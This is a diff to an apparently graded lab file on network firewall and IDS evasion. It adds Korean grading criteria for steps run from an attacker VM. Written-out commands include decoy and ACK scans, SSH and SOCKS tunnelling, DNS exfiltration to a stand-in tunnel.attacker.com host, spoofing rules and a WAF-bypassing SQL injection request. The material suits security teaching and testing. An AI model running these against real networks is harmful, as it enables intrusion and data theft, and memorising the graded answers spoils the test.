@@ -29,6 +29,21 @@ steps:
     type: output_contains
     expect: filtered
     field: stdout
+    semantic:
+      intent: 대상 방화벽의 ACK 필터링 규칙을 nmap -sA 또는 동등한 기법으로 매핑하고 포트별 상태를 식별
+      success_criteria:
+      - nmap -sA 출력에서 unfiltered 또는 filtered 중 하나 이상의 상태가 포함된 포트 매핑 결과 제시
+      - ACK 스캔 원리(RST 응답 여부로 상태 판별, 상태기반/무상태 방화벽 구분) 설명과 실행 결과 해석
+      - 특정 포트에 대해 방화벽 차단 여부를 추정하는 논리 전개
+      acceptable_methods:
+      - nmap -sA -p 22,80,443,8080 <IP> 직접 실행과 출력 제시
+      - hping3 -A 로 단일 포트 ACK 검증 후 응답 유무 보고
+      - scapy 로 ACK 패킷 수동 생성 후 RST 수신 분석
+      - nmap 실행이 불가할 경우 동일 명령의 예상 출력을 근거와 함께 서술
+      negative_signs:
+      - SYN/Connect 스캔 결과(open/closed 만)만 제시하고 ACK 언급 없음
+      - 무응답, 명령 실행 실패, 타임아웃 텍스트만 출력
+      - 방화벽 관련 언급이나 포트 상태 해석이 전혀 없음
   target_vm: attacker
   script: nmap -sA -p 22,80,443,8080 10.20.30.1
   risk_level: low
@@ -70,6 +85,21 @@ steps:
     type: output_contains
     expect: 10.20.30.80
     field: stdout
+    semantic:
+      intent: 소스 IP 위장을 통한 nmap 디코이 스캔 기법 실행 또는 구현 원리 제시
+      success_criteria:
+      - nmap -D 옵션으로 2개 이상의 디코이 IP를 포함한 스캔 명령 제시 및 타겟 IP 포함
+      - 디코이 스캔의 목적(실제 소스 IP 은폐) 설명과 ME 토큰 의미 서술
+      - 스캔 결과 해석(디코이 IP가 로그에 동시 기록되어 분석 지연)
+      acceptable_methods:
+      - nmap -D d1,d2,ME,d3 -p <ports> <target> 실행
+      - hping3 --spoof <fake_ip> 로 단일 위조 패킷 전송
+      - masscan --source-ip 여러개 로 유사 효과
+      - 방어 관점에서 디코이 식별 로직 설명 (실제 디코이 IP가 Live 여부 확인)
+      negative_signs:
+      - 기본 nmap 스캔(디코이 없음)만 실행
+      - 타겟 IP 누락 또는 전혀 다른 스캔 기법 (예 SYN only) 만 제시
+      - 실행 실패 메시지만 출력되고 개념 설명 없음
   target_vm: attacker
   script: nmap -D 10.20.30.50,10.20.30.60,ME,10.20.30.70 -p 80,3000 10.20.30.80
   risk_level: medium
@@ -89,6 +119,22 @@ steps:
     type: output_contains
     expect: ssh -L
     field: stdout
+    semantic:
+      intent: SSH 로컬 포트 포워딩(-L)으로 방화벽 뒤의 내부 서비스에 접근하는 명령 작성·설명
+      success_criteria:
+      - ssh -L <local>:<target>:<port> 형태의 명령 문자열 제시 (quoting 포함)
+      - 로컬 포워딩 원리(암호화 터널을 통해 내부 서비스 접근) 설명
+      - 방화벽이 SSH(22) 만 허용해도 우회 가능하다는 맥락 제시
+      acceptable_methods:
+      - echo '...' 로 명령만 출력
+      - ssh -L 명령을 직접 제시하고 -N -f 옵션 의미 부가 설명
+      - ~/.ssh/config 의 LocalForward 엔트리 예시
+      - putty cli 또는 PowerShell OpenSSH 동등 명령 제시
+      negative_signs:
+      - ssh 접속만 소개 (-L 옵션 없음)
+      - 역방향 포워딩(-R) 만 설명
+      - VPN 등 완전 다른 우회 방법만 제시
+      - 명령 실행 시도 없이 "SSH 란 무엇인가" 수준의 총론만
   target_vm: attacker
   script: echo 'ssh -L 8888:10.20.30.80:3000 -N -f ccc@10.20.30.1'
   risk_level: medium
@@ -108,7 +154,9 @@ steps:
     SOCKS 프록시를 통해 실행할 수 있다.
   verify:
     type: output_contains
-    expect: ssh -D
+    expect:
+    - ssh -D
+    - SOCKS5
     field: stdout
   target_vm: attacker
   script: echo 'ssh -D 1080 -N -f ccc@10.20.30.1 && curl --socks5 127.0.0.1:1080 http://10.20.30.80:3000'
@@ -173,6 +221,22 @@ steps:
     type: output_contains
     expect: Encoded payload
     field: stdout
+    semantic:
+      intent: HTTP POST 본문에 Base64 인코딩된 명령을 은닉하여 전송하는 HTTP 터널링 시뮬레이션
+      success_criteria:
+      - curl -X POST 와 -d 옵션으로 data 필드에 Base64 문자열을 포함한 요청 수행
+      - Base64 인코딩 과정(echo | base64) 또는 최종 인코딩 문자열(d2hvYW1pIHx8...) 중 하나 제시
+      - HTTP 응답 코드 또는 터널 성공 여부 확인
+      acceptable_methods:
+      - bash one-liner (echo ... | base64) 로 payload 생성 후 curl POST
+      - python3 -c "import base64; ..." 로 동일 인코딩
+      - wget --post-data 로 동등 전송
+      - openssl base64 도구 사용
+      negative_signs:
+      - GET 요청으로만 전송 (POST body 터널 아님)
+      - Base64 인코딩 없이 평문으로만 전송
+      - curl 실행 실패만 출력되고 payload 생성 설명 없음
+      - HTTP 터널링 개념 설명 없이 단순 whoami 실행
   target_vm: attacker
   script: 'CMD=$(echo ''whoami && hostname'' | base64) && curl -s -X POST -d "data=$CMD"
     http://10.20.30.80:3000/ -o /dev/null -w ''%{http_code}'' && echo '''' && echo
@@ -222,6 +286,21 @@ steps:
     type: output_contains
     expect: nmap
     field: stdout
+    semantic:
+      intent: IPv6 기반 방화벽 우회를 위해 IPv6 호스트를 탐지하고 IPv4 ACL 이 적용되지 않는 IPv6 경로로 스캔 수행
+      success_criteria:
+      - nmap -6 또는 targets-ipv6-multicast-echo 스크립트 사용 명령 제시
+      - IPv4 ACL 만 있는 환경에서 IPv6 우회가 성립하는 원리(dual stack 맹점) 설명
+      - ff02::1 멀티캐스트 또는 fe80:: 링크로컬 주소 언급
+      acceptable_methods:
+      - nmap --script targets-ipv6-multicast-echo --script-args newtargets -e <iface>
+      - ping6 ff02::1%<iface> 로 IPv6 노드 검색
+      - ip -6 neigh show 로 IPv6 ARP 캐시 확인
+      - ipv6toolkit(scan6) 로 로컬 IPv6 노드 나열
+      negative_signs:
+      - IPv4 nmap 스캔만 실행하고 IPv6 언급 없음
+      - nmap 이란 단어만 포함되고 IPv6 기법 설명·적용이 없음
+      - 네트워크 인터페이스 없어 실행 실패한 텍스트만 출력
   target_vm: attacker
   script: nmap --script targets-ipv6-multicast-echo --script-args newtargets -e eth0
     2>&1 | head -20
@@ -245,6 +324,21 @@ steps:
     type: output_contains
     expect: tunnel
     field: stdout
+    semantic:
+      intent: 명령 실행 결과를 Base64 로 인코딩해 DNS 쿼리 서브도메인에 실어 보내는 DNS 터널링 원리 시연
+      success_criteria:
+      - base64 인코딩된 데이터를 서브도메인으로 포함하는 FQDN 형태 제시 (예 <base64>.tunnel.example.com)
+      - nslookup/dig/host 중 하나로 해당 FQDN 질의 수행
+      - DNS 터널링의 C2 활용 원리(권한 있는 DNS 서버로 데이터 유출) 언급
+      acceptable_methods:
+      - bash echo | base64 | tr -d '=\\n' 으로 페이로드 생성 후 nslookup
+      - python3 -c "import base64; ..." 로 인코딩 후 socket.gethostbyname
+      - dig +short <payload>.domain 사용
+      - dnscat2/iodine 등 툴 사용 예 제시
+      negative_signs:
+      - 일반 nslookup 만 실행 (base64 인코딩 서브도메인 없음)
+      - 인코딩된 페이로드 출력 없이 개념 설명만
+      - DNS 이외 프로토콜 설명만 제시
   target_vm: attacker
   script: 'DATA=$(hostname | base64 | tr -d ''=\n'') && echo "DNS tunnel payload:
     $DATA.tunnel.attacker.com" && nslookup $DATA.tunnel.attacker.com 2>&1 | head -5'
@@ -268,6 +362,21 @@ steps:
     type: output_contains
     expect: SNAT
     field: stdout
+    semantic:
+      intent: iptables SNAT(Source NAT)로 송신 패킷의 출발지 IP 를 위조하는 규칙 작성 (실행 금지, 명령만 제시)
+      success_criteria:
+      - iptables -t nat -A POSTROUTING ... -j SNAT --to-source <IP> 형태의 규칙 제시
+      - POSTROUTING 체인과 SNAT 타겟 사용 이유(송신 경로) 설명
+      - 출발지 IP 가 변조되어 응답/로그가 변조된 IP 로 기록됨을 서술
+      acceptable_methods:
+      - iptables -t nat -A POSTROUTING ... SNAT 규칙 (nf_nat)
+      - nftables `nft add rule ip nat postrouting ip saddr X snat to Y` 동등 규칙
+      - MASQUERADE 규칙으로 대체하고 차이점 설명
+      - 파이썬/Scapy 로 IP spoof 패킷 생성 (커널 NAT 우회) 예시
+      negative_signs:
+      - DNAT 규칙만 제시 (방향 역전)
+      - POSTROUTING/SNAT 언급 없이 단순 route/forward 설명만
+      - 실행 시도 후 권한 에러만 출력되고 규칙 예시 없음
   target_vm: attacker
   script: echo 'iptables -t nat -A POSTROUTING -o eth0 -j SNAT --to-source 10.20.30.50'
     && echo 'iptables -t nat -A PREROUTING -i eth0 -j DNAT --to-destination 10.20.30.201'
@@ -291,6 +400,21 @@ steps:
     type: output_contains
     expect: '200'
     field: stdout
+    semantic:
+      intent: WAF 우회를 위해 User-Agent 위장과 URL 인코딩(%27 등) 을 결합한 curl 요청 수행
+      success_criteria:
+      - curl -A 또는 -H "User-Agent:" 로 비정상 UA(Googlebot 등) 제시
+      - URL 에 %27(') 또는 %20(공백) 등 URL 인코딩된 SQL 페이로드 포함
+      - HTTP 응답 코드(200/403/500) 확인 또는 차단 여부 해석
+      acceptable_methods:
+      - curl -A 'Googlebot' <URL with %27%20OR%201%3D1--> 직접 전송
+      - python requests 로 동등 요청 (headers UA 위조 + quote_plus)
+      - wget -U <UA> --post-data 로 유사 전송
+      - WAF 우회 기법 5 가지(UA, URL encode, case 변조, comment 삽입, HPP) 중 2 개 이상을 실제 요청으로 조합
+      negative_signs:
+      - 기본 curl 만 실행 (UA/인코딩 없음)
+      - URL 인코딩 없이 평문 SQL 페이로드만
+      - 응답 코드 또는 WAF 차단 여부 해석 없음
   target_vm: attacker
   script: "curl -s -A 'Mozilla/5.0 (compatible; Googlebot/2.1)' 'http://10.20.30.80:3000/rest/products/search?q=%27%20OR%201%3D1--'\
     \ \\\n  -o /dev/null \\\n  -w '%{http_code}'"
@@ -349,6 +473,21 @@ steps:
     type: output_contains
     expect: Network Evasion Techniques Report
     field: stdout
+    semantic:
+      intent: 주차 동안 실습한 네트워크 우회 기법(ACK/디코이/SSH터널/ICMP/HTTP/DNS/IPv6/SNAT/WAF/Idle)을 종합 분석한 리포트를 파일로 생성
+      success_criteria:
+      - /tmp/evasion_report.txt (또는 유사 파일)에 다수(최소 5개) 우회 기법을 카테고리별로 정리한 내용 기록
+      - 리포트에 각 기법의 효과와 한계(또는 탐지 관점 대응책) 포함
+      - 생성된 리포트 내용을 cat 또는 동등한 수단으로 출력하여 검증
+      acceptable_methods:
+      - echo -e 로 다줄 문자열을 파일에 리다이렉트 후 cat
+      - python/here-doc 으로 파일 작성
+      - markdown 형식이나 표 형식으로 정리
+      - 리포트 파일 경로가 /tmp 가 아니더라도 작성 내용과 출력이 조건 충족 시 인정
+      negative_signs:
+      - 기법 1-2 개만 나열하고 종합 분석 없음
+      - 파일 생성 없이 화면 출력만
+      - 전혀 관련 없는 내용(예 xss/sqli 방어)만 작성
   target_vm: attacker
   script: 'echo -e ''=== Network Evasion Techniques Report ===\n\n[Packet Level]\n1.
     Fragmentation (-f/--mtu): Effective against signature-based IDS\n2. Decoy (-D):
